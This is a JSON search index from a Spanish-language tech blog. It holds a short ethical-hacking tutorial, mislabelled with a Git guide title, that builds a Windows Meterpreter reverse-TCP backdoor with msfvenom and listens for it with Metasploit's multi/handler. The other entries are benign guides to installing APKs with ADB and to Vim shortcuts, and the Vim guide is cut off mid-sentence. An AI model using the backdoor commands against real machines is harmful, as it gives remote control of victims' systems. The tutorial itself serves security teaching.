[
  {
    "objectID": "ciberseguridad-ethical-hacking-ceh/2024-09-03-ejecutando-payload/index.html",
    "href": "ciberseguridad-ethical-hacking-ceh/2024-09-03-ejecutando-payload/index.html",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Creando y Ejecutando un Payload Malicioso con Metasploit: Una Guía Paso a Paso\nHola a todos! Hoy vamos a sumergirnos en el fascinante mundo de la seguridad informática y la creación de un payload malicioso usando Metasploit. Si bien esta guía es con fines educativos, es crucial recordar que utilizar estas herramientas para actividades maliciosas es ilegal y antiético. ¡Usémoslas para aprender y proteger!\n\n\nPaso 1: Obtener la Dirección IP con ifconfig\nPrimero, necesitamos conocer nuestra dirección IP local para configurar el payload. Usamos el comando ifconfig para obtener esta información. Abre tu terminal y escribe:\nifconfig\nEsto mostrará todas las interfaces de red y sus respectivas direcciones IP. Busca la IP de tu red local. En este ejemplo, supongamos que es 192.168.122.152.\n\n\nPaso 2: Crear el Payload con msfvenom\nAhora que tenemos nuestra dirección IP, vamos a crear el payload. Usaremos msfvenom, una herramienta que viene con Metasploit para generar payloads maliciosos. Queremos crear un payload que permita un acceso remoto a una máquina con Windows. Usamos el siguiente comando:\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.122.152 LPORT=4444 -f exe -o backdoor.exe -a x64\nDesglosamos el comando:\n\n-p windows/x64/meterpreter/reverse_tcp: Especificamos el payload, que en este caso es un Meterpreter reverse TCP para Windows de 64 bits.\nLHOST=192.168.122.152: Establecemos nuestra dirección IP local como el host de escucha.\nLPORT=4444: Elegimos el puerto de escucha (puedes cambiarlo si es necesario).\n-f exe: Indicamos que el formato de salida debe ser un archivo ejecutable de Windows.\n-o backdoor.exe: Nombramos el archivo de salida backdoor.exe.\n-a x64: Especificamos la arquitectura del payload (64 bits).\n\n\n\nPaso 3: Configurar el Handler en Metasploit\nUna vez que tenemos nuestro payload, necesitamos configurar un handler en Metasploit para escuchar las conexiones entrantes. Iniciamos Metasploit con:\nmsfconsole -q\nLa opción -q es para iniciar Metasploit en modo silencioso.\n\n\nPaso 4: Configurar el Exploit Handler\nEn la consola de Metasploit, seguimos estos pasos:\n\nSeleccionar el handler:\nmsf6 &gt; use exploit/multi/handler\nEsto indica que usaremos el módulo handler para gestionar la conexión entrante.\nConfigurar el payload:\nmsf6 &gt; set payload windows/x64/meterpreter/reverse_tcp\nEstablecer el LHOST y LPORT:\nmsf6 &gt; set lhost 192.168.122.152\nmsf6 &gt; set lport 4444\nVerificar las opciones:\nmsf6 &gt; show options\nEsto muestra todas las opciones configuradas para asegurar que todo esté correcto.\n\n\n\nPaso 5: Ejecutar el Handler\nFinalmente, ejecutamos el handler para empezar a escuchar conexiones:\nmsf6 &gt; run\nAhora, el handler está activo y esperando que alguien ejecute el backdoor.exe en su máquina. Cuando esto suceda, obtendrás una sesión de Meterpreter y podrás interactuar con la máquina comprometida.\n\n\nConclusión\nEste proceso demuestra cómo se puede crear y manejar un payload malicioso usando Metasploit. Nuevamente, subrayo la importancia de utilizar este conocimiento de manera ética y legal, principalmente para probar y fortalecer la seguridad de sistemas. Siempre asegúrate de tener permiso para realizar estas pruebas.\nEspero que hayas encontrado esta guía informativa y útil. ¡Hasta la próxima!\n\n\nPublicaciones Similares\nSi te interesó este artículo, te recomendamos que explores otros blogs y recursos relacionados que pueden ampliar tus conocimientos. Aquí te dejo algunas sugerencias:\n\n Ejecutando Payload\n\nEsperamos que encuentres estas publicaciones igualmente interesantes y útiles. ¡Disfruta de la lectura!\n\n\n\n\nReutilizaciónCC BY-SA 4.0Cómo citarPor favor, cita este trabajo como:\nAchalma, Edison. 2024. “Guía de Git Cómo trabajar en equipo en\nproyectos,” September. https://achalmaedison.netlify.app/ciberseguridad-ethical-hacking-ceh/2024-09-03-ejecutando-payload/."
  },
  {
    "objectID": "operating-system/2021-10-21-usando-apk-en-windown-11/index.html",
    "href": "operating-system/2021-10-21-usando-apk-en-windown-11/index.html",
    "title": "Cómo usar APK en Windows 11 una guía paso a paso",
    "section": "",
    "text": "Aquí te explicamos cómo descargar un archivo APK para instalar una aplicación de Android en tu PC con Windows 11 usando el Subsistema de Windows para Android. Puedes instalar el Subsistema de Windows para Android manualmente en tu PC con su archivo Msixbundle siguiendo nuestra guía aquí.\n\n\n\nInstala el Subsistema de Windows para Android.\nAbre la aplicación ‘Subsistema de Windows para Android’ en tu PC. Para ello, presiona la tecla Windows y busca Subsistema de Windows para Android.\nHaz clic en la aplicación para abrirla.\nDentro de la aplicación, activa el Modo Desarrollador.\n\n\n\n\n\nVisita la página de herramientas de la plataforma SDK de Google aquí.\nDescarga SDK Platform-Tools para Windows.\nAcepta los términos y condiciones y haz clic en el botón de descarga.\nSe descargará un archivo ZIP llamado platform-tools_rXX.X.X-windows.zip (la versión puede variar).\nCrea una carpeta separada en el Explorador de Windows, por ejemplo, C:\\Plataforma-Tools.\nMueve el archivo ZIP descargado a esta carpeta.\nHaz clic derecho en el archivo y selecciona Extraer todo, luego haz clic en Extraer.\nAbre la carpeta platform-tools, donde encontrarás adb.exe y otros archivos.\n\n\n\n\n\nAbre la carpeta platform-tools.\nHaz clic en la barra de direcciones, escribe cmd y presiona Enter.\nSe abrirá una ventana de comandos en la ubicación de la carpeta platform-tools.\nDescarga el archivo APK de la aplicación de Android que deseas instalar.\n\nPor ejemplo, para instalar Snapchat, busca Snapchat APK en Google y descarga el archivo de una fuente confiable.\nRenombra el archivo a algo simple, como snapchat.apk, y muévelo a la carpeta platform-tools.\n\nAbre el Subsistema de Windows para Android y copia la dirección IP en la opción de Modo Desarrollador.\nEn la ventana de comandos, ejecuta el siguiente comando:\nadb.exe connect [DIRECCIÓN_IP]\nEjemplo:\nadb.exe connect 127.0.0.1:12345\nLuego, instala la aplicación ejecutando:\nadb.exe install [NOMBRE_DEL_APK]\nEjemplo:\nadb.exe install snapchat.apk\nCuando la instalación finalice, verás el mensaje Success.\nCierra la ventana de comandos.\nAbre la aplicación en tu PC escribiendo su nombre en el menú Inicio (por ejemplo, Snapchat).\n\n\n\n\nSi prefieres instalar APKs con un doble clic en lugar de usar comandos ADB, puedes configurarlo siguiendo nuestra guía aquí."
  },
  {
    "objectID": "operating-system/2021-10-21-usando-apk-en-windown-11/index.html#paso-1-habilitar-el-modo-de-desarrollador-en-el-subsistema-de-windows",
    "href": "operating-system/2021-10-21-usando-apk-en-windown-11/index.html#paso-1-habilitar-el-modo-de-desarrollador-en-el-subsistema-de-windows",
    "title": "Cómo usar APK en Windows 11 una guía paso a paso",
    "section": "",
    "text": "Instala el Subsistema de Windows para Android.\nAbre la aplicación ‘Subsistema de Windows para Android’ en tu PC. Para ello, presiona la tecla Windows y busca Subsistema de Windows para Android.\nHaz clic en la aplicación para abrirla.\nDentro de la aplicación, activa el Modo Desarrollador."
  },
  {
    "objectID": "operating-system/2021-10-21-usando-apk-en-windown-11/index.html#paso-2-instalar-las-herramientas-de-la-plataforma-sdk",
    "href": "operating-system/2021-10-21-usando-apk-en-windown-11/index.html#paso-2-instalar-las-herramientas-de-la-plataforma-sdk",
    "title": "Cómo usar APK en Windows 11 una guía paso a paso",
    "section": "",
    "text": "Visita la página de herramientas de la plataforma SDK de Google aquí.\nDescarga SDK Platform-Tools para Windows.\nAcepta los términos y condiciones y haz clic en el botón de descarga.\nSe descargará un archivo ZIP llamado platform-tools_rXX.X.X-windows.zip (la versión puede variar).\nCrea una carpeta separada en el Explorador de Windows, por ejemplo, C:\\Plataforma-Tools.\nMueve el archivo ZIP descargado a esta carpeta.\nHaz clic derecho en el archivo y selecciona Extraer todo, luego haz clic en Extraer.\nAbre la carpeta platform-tools, donde encontrarás adb.exe y otros archivos."
  },
  {
    "objectID": "operating-system/2021-10-21-usando-apk-en-windown-11/index.html#paso-3-instalar-la-aplicación-de-android",
    "href": "operating-system/2021-10-21-usando-apk-en-windown-11/index.html#paso-3-instalar-la-aplicación-de-android",
    "title": "Cómo usar APK en Windows 11 una guía paso a paso",
    "section": "",
    "text": "Abre la carpeta platform-tools.\nHaz clic en la barra de direcciones, escribe cmd y presiona Enter.\nSe abrirá una ventana de comandos en la ubicación de la carpeta platform-tools.\nDescarga el archivo APK de la aplicación de Android que deseas instalar.\n\nPor ejemplo, para instalar Snapchat, busca Snapchat APK en Google y descarga el archivo de una fuente confiable.\nRenombra el archivo a algo simple, como snapchat.apk, y muévelo a la carpeta platform-tools.\n\nAbre el Subsistema de Windows para Android y copia la dirección IP en la opción de Modo Desarrollador.\nEn la ventana de comandos, ejecuta el siguiente comando:\nadb.exe connect [DIRECCIÓN_IP]\nEjemplo:\nadb.exe connect 127.0.0.1:12345\nLuego, instala la aplicación ejecutando:\nadb.exe install [NOMBRE_DEL_APK]\nEjemplo:\nadb.exe install snapchat.apk\nCuando la instalación finalice, verás el mensaje Success.\nCierra la ventana de comandos.\nAbre la aplicación en tu PC escribiendo su nombre en el menú Inicio (por ejemplo, Snapchat)."
  },
  {
    "objectID": "operating-system/2021-10-21-usando-apk-en-windown-11/index.html#cargar-apk-automáticamente-con-doble-clic",
    "href": "operating-system/2021-10-21-usando-apk-en-windown-11/index.html#cargar-apk-automáticamente-con-doble-clic",
    "title": "Cómo usar APK en Windows 11 una guía paso a paso",
    "section": "",
    "text": "Si prefieres instalar APKs con un doble clic en lugar de usar comandos ADB, puedes configurarlo siguiendo nuestra guía aquí."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "",
    "text": "¿Estás buscando mejorar tu fluidez y productividad al editar texto en Vim? ¿Quieres dominar los atajos de teclado y comandos que te permitirán aprovechar al máximo este potente editor de texto? ¡Has llegado al lugar indicado!\nEn el mundo de la edición de texto, Vim destaca como una herramienta poderosa y altamente personalizable. Sin embargo, para muchos usuarios nuevos, su enfoque basado en modos y su amplio conjunto de comandos pueden resultar abrumadores al principio. Pero no te preocupes, estamos aquí para ayudarte a superar esa barrera inicial y llevar tus habilidades de Vim al siguiente nivel.\nEn este blog, exploraremos a fondo los atajos de teclado y comandos esenciales para usar Vim de manera eficiente. Te proporcionaremos una guía completa que abarcará desde los conceptos básicos hasta técnicas avanzadas, permitiéndote aprovechar al máximo este editor de texto icónico.\nDescubrirás cómo navegar rápidamente por tus archivos, editar y manipular texto con fluidez, realizar búsquedas y reemplazos de manera eficiente, trabajar con múltiples archivos y ventanas, personalizar Vim según tus preferencias y mucho más. Además, te proporcionaremos consejos y trucos prácticos para optimizar tu flujo de trabajo y ahorrar tiempo en tus tareas diarias de edición de texto.\nNo importa si eres un principiante curioso o un usuario experimentado en busca de nuevas técnicas, mi objetivo es ayudarte a desbloquear todo el potencial de Vim y convertirte en un maestro de la edición eficiente.\n¡Prepárate para desafiar tus límites, perfeccionar tus habilidades y descubrir un nuevo nivel de productividad con Vim! Sigue leyendo y comienza tu viaje hacia la maestría de Vim con nuestros atajos de teclado y comandos indispensables.\n¡La eficiencia está a solo unos atajos de distancia!\n\n\nAntes de sumergirnos en los fantásticos atajos de teclado y comandos de Vim, es importante comprender qué es exactamente Vim y por qué es tan popular entre los usuarios de edición de texto.\nVim, que significa “Vi Improved” (Vi mejorado), es un editor de texto altamente configurable y poderoso. Se basa en el antiguo editor de línea de comandos llamado Vi, que ha sido una herramienta estándar en los sistemas Unix durante décadas.\n\n\n\nLa principal ventaja de utilizar Vim es su enfoque en la eficiencia y la productividad. Con los atajos de teclado y comandos adecuados, puedes editar texto de forma más rápida y eficiente que nunca. No más tediosos movimientos del ratón o desplazamientos interminables. Con Vim, puedes mantener tus manos en el teclado y volar a través del texto como un verdadero experto.\nAdemás de su enfoque en la eficiencia, Vim ofrece una serie de características que lo hacen destacar entre otros editores de texto. Algunas de las ventajas más notables incluyen:\n\nModos de funcionamiento: Vim tiene modos distintos, como el modo normal, el modo de inserción y el modo de comando. Cada modo tiene un propósito específico, lo que te permite realizar diversas acciones con facilidad y fluidez.\nPersonalización y extensibilidad: Vim es altamente personalizable. Puedes ajustar su apariencia, configurar atajos de teclado personalizados y aprovechar su amplia gama de complementos y extensiones para adaptarlo a tus preferencias y necesidades.\nPotentes capacidades de búsqueda y reemplazo: Con Vim, puedes buscar y reemplazar texto de manera rápida y precisa. Sus comandos de búsqueda te permiten encontrar palabras o patrones específicos en todo el archivo o incluso en múltiples archivos a la vez.\nEdición en múltiples archivos: Vim facilita el trabajo con múltiples archivos al mismo tiempo. Puedes abrir y editar varios archivos en diferentes ventanas o pestañas, lo que te permite alternar rápidamente entre ellos y mantener tu flujo de trabajo organizado.\n\n\n\n\nAntes de sumergirnos en los atajos y comandos de Vim, es importante realizar una configuración inicial para adaptarlo a tus preferencias. Aquí hay algunos pasos clave para empezar:\n\nInstalación de Vim: Si aún no tienes Vim instalado en tu sistema, debes descargarlo e instalarlo. Puedes encontrar la última versión en el sitio web oficial de Vim o utilizar un gestor de paquetes si estás en un sistema operativo compatible.\nCreación del archivo .vimrc: El archivo .vimrc es donde puedes personalizar la configuración de Vim. Puedes establecer atajos de teclado personalizados, activar o desactivar características específicas, y mucho más. Es tu espacio para hacer que Vim se sienta como en casa.\nExploración de los ajustes básicos: En tu archivo .vimrc, puedes establecer algunas configuraciones iniciales básicas, como el número de líneas visibles, el formato de tabulación, el resaltado de sintaxis y los atajos de teclado predefinidos. Estos ajustes pueden mejorar tu experiencia de edición desde el principio.\n\n¡Ahora estás listo para comenzar tu viaje con Vim! En los siguientes apartados, te sumergirás en los atajos de teclado y comandos esenciales que te ayudarán a aprovechar al máximo este poderoso editor de texto."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#qué-es-vim",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#qué-es-vim",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "",
    "text": "Antes de sumergirnos en los fantásticos atajos de teclado y comandos de Vim, es importante comprender qué es exactamente Vim y por qué es tan popular entre los usuarios de edición de texto.\nVim, que significa “Vi Improved” (Vi mejorado), es un editor de texto altamente configurable y poderoso. Se basa en el antiguo editor de línea de comandos llamado Vi, que ha sido una herramienta estándar en los sistemas Unix durante décadas."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#ventajas-de-utilizar-vim-como-editor-de-texto",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#ventajas-de-utilizar-vim-como-editor-de-texto",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "",
    "text": "La principal ventaja de utilizar Vim es su enfoque en la eficiencia y la productividad. Con los atajos de teclado y comandos adecuados, puedes editar texto de forma más rápida y eficiente que nunca. No más tediosos movimientos del ratón o desplazamientos interminables. Con Vim, puedes mantener tus manos en el teclado y volar a través del texto como un verdadero experto.\nAdemás de su enfoque en la eficiencia, Vim ofrece una serie de características que lo hacen destacar entre otros editores de texto. Algunas de las ventajas más notables incluyen:\n\nModos de funcionamiento: Vim tiene modos distintos, como el modo normal, el modo de inserción y el modo de comando. Cada modo tiene un propósito específico, lo que te permite realizar diversas acciones con facilidad y fluidez.\nPersonalización y extensibilidad: Vim es altamente personalizable. Puedes ajustar su apariencia, configurar atajos de teclado personalizados y aprovechar su amplia gama de complementos y extensiones para adaptarlo a tus preferencias y necesidades.\nPotentes capacidades de búsqueda y reemplazo: Con Vim, puedes buscar y reemplazar texto de manera rápida y precisa. Sus comandos de búsqueda te permiten encontrar palabras o patrones específicos en todo el archivo o incluso en múltiples archivos a la vez.\nEdición en múltiples archivos: Vim facilita el trabajo con múltiples archivos al mismo tiempo. Puedes abrir y editar varios archivos en diferentes ventanas o pestañas, lo que te permite alternar rápidamente entre ellos y mantener tu flujo de trabajo organizado."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#configuración-inicial-de-vim",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#configuración-inicial-de-vim",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "",
    "text": "Antes de sumergirnos en los atajos y comandos de Vim, es importante realizar una configuración inicial para adaptarlo a tus preferencias. Aquí hay algunos pasos clave para empezar:\n\nInstalación de Vim: Si aún no tienes Vim instalado en tu sistema, debes descargarlo e instalarlo. Puedes encontrar la última versión en el sitio web oficial de Vim o utilizar un gestor de paquetes si estás en un sistema operativo compatible.\nCreación del archivo .vimrc: El archivo .vimrc es donde puedes personalizar la configuración de Vim. Puedes establecer atajos de teclado personalizados, activar o desactivar características específicas, y mucho más. Es tu espacio para hacer que Vim se sienta como en casa.\nExploración de los ajustes básicos: En tu archivo .vimrc, puedes establecer algunas configuraciones iniciales básicas, como el número de líneas visibles, el formato de tabulación, el resaltado de sintaxis y los atajos de teclado predefinidos. Estos ajustes pueden mejorar tu experiencia de edición desde el principio.\n\n¡Ahora estás listo para comenzar tu viaje con Vim! En los siguientes apartados, te sumergirás en los atajos de teclado y comandos esenciales que te ayudarán a aprovechar al máximo este poderoso editor de texto."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#modo-normal",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#modo-normal",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Modo normal",
    "text": "Modo normal\nEl modo normal es el modo principal de Vim. Aquí es donde puedes navegar por el archivo, realizar ediciones rápidas y ejecutar comandos. En este modo, las teclas que presiones se interpretan como comandos, no como caracteres para ingresar. Es como convertir tu teclado en un control remoto para manipular el texto."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#modo-de-inserción",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#modo-de-inserción",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Modo de inserción",
    "text": "Modo de inserción\nEl modo de inserción es donde puedes escribir y editar texto como en cualquier otro editor de texto convencional. Cuando estás en este modo, las teclas que presiones se insertan directamente en el archivo. Es el modo en el que puedes escribir tus palabras y expresarte libremente."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#modo-de-comando",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#modo-de-comando",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Modo de comando",
    "text": "Modo de comando\nEl modo de comando es donde puedes ejecutar comandos más avanzados en Vim. Puedes utilizar estos comandos para buscar y reemplazar texto, realizar cambios en el archivo y personalizar la configuración de Vim. Aquí es donde puedes aprovechar el verdadero poder de Vim y llevar tus habilidades de edición al siguiente nivel.\nPara intercambiar entre cada uno de los modos usa los siguientes atajos de teclado:\n\n\n\n\n\n\n\n\nModo\nShortcuts or commands\nFunción\n\n\n\n\nModo normal\nEsc o Ctrl+c\nEste atajo te lleva al modo normal de Vim. Aquí puedes navegar por el archivo, realizar ediciones rápidas y ejecutar comandos.\n\n\nModo de inserción\ni\nPresionar i te lleva al modo de inserción. Aquí puedes escribir y editar texto como en cualquier otro editor de texto.\n\n\nModo de comando\n:\nAl presionar : accederás al modo de comando. Aquí puedes ejecutar comandos avanzados en Vim. Desde buscar y reemplazar texto hasta personalizar la configuración."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#movimiento-básico-con-las-teclas-h-j-k-l",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#movimiento-básico-con-las-teclas-h-j-k-l",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Movimiento básico con las teclas h, j, k, l",
    "text": "Movimiento básico con las teclas h, j, k, l\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\nh\nLa tecla h te permite mover el cursor hacia la izquierda.\n\n\nj\nLa tecla j te permite mover el cursor hacia abajo.\n\n\nk\nLa tecla k te permite mover el cursor hacia arriba.\n\n\nl\nLa tecla l te permite mover el cursor hacia la derecha."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#saltos-rápidos-en-el-archivo-con-gg-y-g",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#saltos-rápidos-en-el-archivo-con-gg-y-g",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Saltos rápidos en el archivo con gg y G",
    "text": "Saltos rápidos en el archivo con gg y G\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\ngg\nPresionar gg te lleva al comienzo del archivo.\n\n\nG\nPresionar G te lleva al final del archivo."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#navegación-por-palabras-con-w-b-e",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#navegación-por-palabras-con-w-b-e",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Navegación por palabras con w, b, e",
    "text": "Navegación por palabras con w, b, e\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\nw\nPresionar w te lleva al inicio de la siguiente palabra.\n\n\nb\nPresionar b te lleva al inicio de la palabra anterior.\n\n\ne\nPresionar e te lleva al final de la palabra actual."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#desplazamiento-por-páginas-y-ventanas",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#desplazamiento-por-páginas-y-ventanas",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Desplazamiento por páginas y ventanas",
    "text": "Desplazamiento por páginas y ventanas\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\nCtrl + f\nPresionar Ctrl + f te permite desplazarte hacia adelante por una página.\n\n\nCtrl + b\nPresionar Ctrl + b te permite desplazarte hacia atrás por una página.\n\n\nCtrl + u\nPresionar Ctrl + u te permite desplazarte hacia arriba por media página.\n\n\nCtrl + d\nPresionar Ctrl + d te permite desplazarte hacia abajo por media página.\n\n\nCtrl + w + w\nPresionar Ctrl + w + w te permite cambiar de ventana en Vim. Si tienes varias ventanas abiertas, este atajo te lleva a la siguiente ventana."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#otros-movimientos-del-cursor",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#otros-movimientos-del-cursor",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Otros movimientos del cursor",
    "text": "Otros movimientos del cursor\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\nW\nMover el cursor al inicio de la siguiente palabra.\n\n\nB\nMover el cursor al inicio de la palabra anterior.\n\n\nE\nDesplazar el cursor al final de la palabra actual.\n\n\n0\nPosicionar el cursor al inicio de la línea actual.\n\n\n$ o Fin\nPosicionar el cursor al final de la línea actual.\n\n\n_\nMover el cursor al primer carácter que no sea un espacio en la línea actual.\n\n\n+\nMover el cursor al primer carácter que no sea un espacio en la línea siguiente.\n\n\n-\nMover el cursor al primer carácter que no sea un espacio en la línea anterior.\n\n\nshift + a\nPosicionar el cursor al final de la línea actual y cambiar al modo insertar.\n\n\nshift + 5\nMover el cursor del inicio al final de un paréntesis y viceversa."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#navegación-por-el-documento",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#navegación-por-el-documento",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Navegación por el documento",
    "text": "Navegación por el documento\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\n5 + Enter\nDirigirse 5 líneas más abajo respecto a la línea actual.\n\n\n10gg\nPosicionar el cursor en la línea 10 del documento.\n\n\n16 + Mayús + g\nDirigirse a la línea 16 del fichero de texto.\n\n\n}\nHacer saltar el cursor al párrafo siguiente.\n\n\n{\nHacer saltar el cursor al párrafo anterior.\n\n\ngi\nPosicionar el cursor en la última palabra editada del buffer actual.\n\n\nH\nMover el cursor a la parte superior de la pantalla.\n\n\nM\nMover el cursor a la parte media de la pantalla.\n\n\nL\nMover el cursor a la parte inferior de la pantalla.\n\n\nCtrl+e\nMover una pantalla hacia abajo sin mover el cursor de posición.\n\n\nCtrl+y\nMover una pantalla hacia arriba sin mover el cursor de posición."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#inserción-y-edición-de-texto",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#inserción-y-edición-de-texto",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Inserción y edición de texto",
    "text": "Inserción y edición de texto\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\ni\nPresionar i te permite insertar texto en el lugar donde se encuentra el cursor.\n\n\na\nPresionar a te permite agregar texto después del lugar donde se encuentra el cursor.\n\n\nA\nPresionar A te lleva al final de la línea actual para comenzar a insertar texto.\n\n\no\nPresionar o te permite abrir una nueva línea debajo de la línea actual para comenzar a escribir.\n\n\nCtrl+ flecha derecha\nAvanzar una palabra hacia la derecha en modo inserción.\n\n\nCtrl+ flecha izquierda\nAvanzar una palabra hacia la izquierda en modo inserción.\n\n\nI\nInsertar texto al principio de una línea.\n\n\nA\nInsertar texto al final de una línea.\n\n\nO\nCrear una línea en blanco justo encima de la línea actual y pasar al modo inserción.\n\n\nea\nInsertar texto después de una palabra.\n\n\nCtrl + p\nAutocompletar la palabra que tenemos escrita a medias con otra palabra anterior al cursor.\n\n\nCtrl + w + cursores\nCambiar entre las distintas ventanas abiertas en Vim.\n\n\nCtrl+g\nMostrar el número de líneas de un fichero."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#inserciòn-de-texto-repetitivo-o-secuencial",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#inserciòn-de-texto-repetitivo-o-secuencial",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Inserciòn de texto repetitivo o secuencial",
    "text": "Inserciòn de texto repetitivo o secuencial\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\n40i- + Esc + Enter\nInserta 40 guiones.\n\n\n10i + hola mundo + Esc + Enter\nEscribe “hola mundo” 10 veces.\n\n\ni + achalma + Esc + 20.\nEscribe “achalma” 20 veces.\n\n\n:put=range(1,10)\nEscribe los números del 1 al 10."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#eliminación-de-caracteres-palabras-y-líneas",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#eliminación-de-caracteres-palabras-y-líneas",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Eliminación de caracteres, palabras y líneas",
    "text": "Eliminación de caracteres, palabras y líneas\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\nx\nPresionar x te permite eliminar el carácter bajo el cursor.\n\n\ndw\nPresionar dw te permite eliminar la palabra desde el cursor hasta el final.\n\n\ndd\nPresionar dd te permite eliminar toda la línea actual."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#copiar-y-pegar-texto",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#copiar-y-pegar-texto",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Copiar y pegar texto",
    "text": "Copiar y pegar texto\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\nyy\nPresionar yy te permite copiar la línea actual.\n\n\n2yy\nCopia 2 líneas a partir de donde está el cursor.\n\n\ny$\nCopia desde la posición actual del cursor hasta el final de la línea.\n\n\nyw\nCopia la palabra a partir de la posición actual del cursor hasta el final de la palabra.\n\n\nyiw\nCopia la palabra actual.\n\n\n:10,20y\nCopia desde la línea 10 hasta la línea 20.\n\n\n120y\nCopia la línea 120.\n\n\ndd\nCorta la línea completa.\n\n\n2dd\nCorta 2 líneas a partir de donde está el cursor.\n\n\nd$ o D\nCorta desde la posición actual del cursor hasta el final de la línea.\n\n\ndw\nCorta la palabra desde la posición actual del cursor hasta el final de la palabra.\n\n\ndiw\nCorta la palabra actual.\n\n\nx\nCorta un solo carácter.\n\n\np\nPega una línea debajo de la posición actual del cursor.\n\n\n:129put\nPega el contenido del portapapeles en la línea 129 del documento.\n\n\nshift + p\nPega una línea arriba de la posición actual del cursor.\n\n\n\n“¡No te preocupes, también puedes copiar y pegar texto en VIM utilizando el modo visual! Sigue estos pasos sencillos:\n\nPosiciona el cursor en el punto desde donde deseas comenzar a copiar.\nPresiona la letra ‘v’ para entrar en el modo 